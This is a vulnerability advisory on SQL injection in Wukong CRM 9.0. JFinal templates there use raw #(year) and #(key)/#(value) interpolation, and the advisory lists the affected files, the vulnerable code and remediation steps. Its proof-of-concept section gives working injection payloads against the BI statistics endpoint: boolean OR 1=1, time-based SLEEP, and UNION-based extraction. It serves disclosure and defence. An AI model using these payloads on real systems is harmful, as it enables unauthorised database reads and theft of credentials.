# V-W001: Wukong CRM (悟空CRM) SQL Injection via JFinal Raw Interpolation

## Vulnerability Information

| Item | Detail |
|------|--------|
| Product | Wukong CRM (悟空CRM) 9.0 |
| Repository | https://github.com/72crm/72crm-java |
| Type | CWE-89: SQL Injection |
| Severity | High |
| Attack Vector | Network (Authenticated) |
| Framework | JFinal |

## Description

Wukong CRM 9.0 contains multiple SQL injection vulnerabilities caused by using JFinal's raw interpolation syntax `#(variable)` instead of the parameterized `#para(variable)` in SQL template files. The most directly exploitable is the `year` parameter in the Business Intelligence (BI) module's `taskCompleteStatistics` API.

### Root Cause

JFinal SQL templates support two interpolation modes:
- `#para(variable)` — generates parameterized `?` placeholders (SAFE)
- `#(variable)` — raw string interpolation directly into SQL (UNSAFE)

Multiple SQL template files use `#(variable)` for user-controlled parameters.

## Vulnerability Details

### 1. BI Module — `year` Parameter SQL Injection (Primary)

**Controller**: `BiController.java` (line 52)
```java
@Permissions("bi:achievement:read")
@NotNullValidate(value = "year", message = "year不能为空")
public void taskCompleteStatistics(@Para("year") String year, @Para("type") Integer type,
                                    @Para("deptId") Integer deptId, @Para("userId") Integer userId) {
    renderJson(biService.taskCompleteStatistics(year, type, deptId, userId));
}
```

**Service**: `BiService.java` (line 41-50)
```java
public R taskCompleteStatistics(String year, Integer status, Integer deptId, Integer userId) {
    Kv kv = Kv.by("map", MonthEnum.values()).set("year", year);  // year passed directly
    // ...
    sqlPara = Db.getSqlPara("bi.base.taskCompleteStatistics", kv);
    recordList = Db.find(sqlPara);
}
```

**SQL Template**: `base.sql` (lines 88, 118)
```sql
-- Line 88: Raw interpolation inside CONCAT string
DATE_FORMAT(order_date, '%Y%m') = CONCAT('#(year)', '#(x.value)')

-- Line 118: Raw interpolation without quotes (direct integer context)
and a.year = #(year)
```

**Attack**: The `year` parameter is a user-controlled `String` that is directly interpolated into SQL without parameterization or validation.

### 2. Customer Module — Field Duplicate Check (Secondary)

**SQL Template**: `customer.sql` (line 210)
```sql
#sql ("queryFieldDuplicate")
   select count(1) from `72crm_crm_customer` where #(key) = '#(value)'
#end
```

Both `#(key)` and `#(value)` use raw interpolation. The `value` parameter originates from user-submitted customer field data during lead-to-customer conversion (second-order SQL injection).

**Caller**: `CrmLeadsService.java` (line 257)
```java
if (isUnique == 1 && Db.template("crm.customer.queryFieldDuplicate",
    Kv.by("key", key).set("value", customerMap.get(key))).queryInt() > 0) {
    return R.error(name + "已存在");
}
```

## Affected Files

| File | Line | Vulnerability |
|------|------|---------------|
| `src/main/resources/template/bi/base.sql` | 88, 118 | `#(year)` raw interpolation |
| `src/main/resources/template/crm/customer.sql` | 210 | `#(key)`, `#(value)` raw interpolation |
| `src/main/java/com/kakarote/crm9/erp/bi/controller/BiController.java` | 52 | String `year` param, no validation |
| `src/main/java/com/kakarote/crm9/erp/bi/service/BiService.java` | 41-50 | Passes `year` to SQL template |
| `src/main/java/com/kakarote/crm9/erp/crm/service/CrmLeadsService.java` | 257 | Passes field value to SQL template |

## Proof of Concept

### Step 1: Normal BI Statistics Request

```
POST /bi/taskCompleteStatistics
year=2026&type=3&userId=1&status=1
```

### Step 2: SQL Injection via `year` Parameter

```
POST /bi/taskCompleteStatistics
year=2026 OR 1=1-- &type=3&userId=1&status=1
```

The `year` parameter is interpolated at `base.sql:118` as:
```sql
and a.year = 2026 OR 1=1--
```

This breaks out of the integer comparison and returns all records.

### Step 3: Time-Based Blind SQL Injection

```
POST /bi/taskCompleteStatistics
year=2026 AND SLEEP(5)-- &type=3&userId=1&status=1
```

### Step 4: UNION-Based Data Extraction

```
POST /bi/taskCompleteStatistics
year=2026 UNION SELECT user(),version(),database(),4,5-- &type=3&userId=1&status=1
```

## Impact

1. **Database Data Extraction**: Authenticated users with BI read permission can extract arbitrary data from the database
2. **Privilege Escalation**: Low-privilege users with BI access can read admin credentials and other sensitive data
3. **Data Modification**: INSERT/UPDATE/DELETE possible via stacked queries (MySQL dependent)
4. **Second-Order Attack**: Customer field values stored via lead creation can trigger SQL injection during lead conversion

## Remediation

1. **Replace `#(year)` with `#para(year)`** in `base.sql` lines 88, 94, 104, 112, 118
2. **Replace `#(key)` and `#(value)` with `#para(key)` and `#para(value)`** in `customer.sql` line 210 (note: `#para()` cannot be used for column names, so `key` should be validated against a whitelist)
3. **Add input validation**: Validate `year` as a 4-digit integer in the controller before passing to service
4. **Audit all `#()` usage**: Search all `.sql` template files for `#(` patterns and replace with `#para(` where the parameter comes from user input

## Source Code Verification (Confirmed)

WukongCRM uses JFinal framework which does not have a pre-built Docker image. Verification is based on **static code analysis** of three independent source files.

### Confirmation 1: SQL Template Raw Interpolation

**File**: `src/main/resources/template/bi/base.sql` (lines 88, 118)

```sql
-- Line 88: year used inside CONCAT string — raw interpolation
and DATE_FORMAT(order_date, '%Y%m') = CONCAT('#(year)', '#(x.value)')

-- Line 118: year used directly in integer comparison — raw interpolation without quotes
and a.year = #(year)
```

`#(year)` is JFinal's raw string interpolation (equivalent to `${}` in MyBatis). It inserts the value directly into the SQL string without parameterization.

### Confirmation 2: Controller — No Input Validation

**File**: `src/main/java/com/kakarote/crm9/erp/bi/controller/BiController.java` (lines 49-53)

```java
@Permissions("bi:achievement:read")
@NotNullValidate(value = "year", message = "year不能为空")  // Only validates non-empty
public void taskCompleteStatistics(@Para("year") String year, ...) {
    renderJson(biService.taskCompleteStatistics(year, type, deptId, userId));
    // ↑ year passed directly as String — no pattern validation, no sanitization
}
```

The `@NotNullValidate` only ensures `year` is not empty, does not restrict to 4-digit integers.

### Confirmation 3: Service — year Passed Directly to SQL Template

**File**: `src/main/java/com/kakarote/crm9/erp/bi/service/BiService.java` (lines 41-50)

```java
public R taskCompleteStatistics(String year, Integer status, Integer deptId, Integer userId) {
    Kv kv = Kv.by("map", MonthEnum.values()).set("year", year);  // year added to Kv map
    // ...
    sqlPara = Db.getSqlPara("bi.base.taskCompleteStatistics", kv);  // year → #(year) → raw SQL
    recordList = Db.find(sqlPara);  // SQL executed with injected value
}
```

**Attack payload** for `year` parameter:
```
2026 AND SLEEP(5)-- 
```

Results in SQL: `and a.year = 2026 AND SLEEP(5)--` — confirmed time-based blind SQL injection.

## Verification Environment

- Source Code: Wukong CRM 9.0 (72crm-java) — static code analysis
- Framework: JFinal + MySQL
- Date: 2026-04-13
